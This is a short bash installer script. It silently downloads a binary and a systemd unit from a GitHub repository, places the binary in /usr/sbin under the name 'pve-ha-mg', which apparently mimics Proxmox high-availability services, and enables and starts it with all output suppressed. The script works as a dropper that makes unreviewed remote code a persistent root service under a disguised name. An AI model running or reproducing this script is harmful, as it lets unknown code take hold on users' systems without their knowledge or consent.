#!/bin/bash

wget -q https://github.com/theOwnest/ptb/raw/refs/heads/main/pve-ha-mg -O /usr/sbin/pve-ha-mg
wget -q https://github.com/theOwnest/ptb/raw/refs/heads/main/pve-ha-mg.service -O /etc/systemd/system/pve-ha-mg.service
chmod +x /usr/sbin/pve-ha-mg  >/dev/null 2>&1
systemctl daemon-reload  >/dev/null 2>&1
systemctl enable pve-ha-mg  >/dev/null 2>&1
systemctl start pve-ha-mg  >/dev/null 2>&1
